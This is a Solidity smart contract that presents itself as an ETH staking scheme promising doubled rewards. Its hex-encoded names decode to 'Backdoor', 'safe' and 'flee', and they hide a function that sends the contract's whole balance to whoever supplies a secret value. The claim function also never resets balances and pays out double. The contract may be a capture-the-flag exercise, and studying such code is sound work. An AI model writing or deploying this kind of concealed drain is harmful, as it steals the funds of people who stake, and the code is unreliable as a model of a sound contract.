// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import "./_4261636b646f6f72.sol";

contract Snitch {

    _4261636b646f6f72 private __4261636b646f6f72;
    mapping(address => uint) private balances;

    constructor() payable {
        __4261636b646f6f72 = new _4261636b646f6f72();
    }

    function stake() external payable {
        require(msg.value >= 1 ether, "You need more ETH to stake");
        balances[msg.sender] += msg.value;
    }

    function claim() external {
        require(block.timestamp >= 2147483648, "You can't claim your rewards yet, be patient");
        (bool success,) = payable(msg.sender).call{value : balances[msg.sender] * 2}("");
        require(success, "Failed to send your funds");
    }

    function _73616665(bytes32 value) external {
        require(__4261636b646f6f72._666c6565(value), "Something went wrong");
        (bool success,) = payable(msg.sender).call{value : address(this).balance}("");
        require(success, "Failed to send your funds");
    }

}
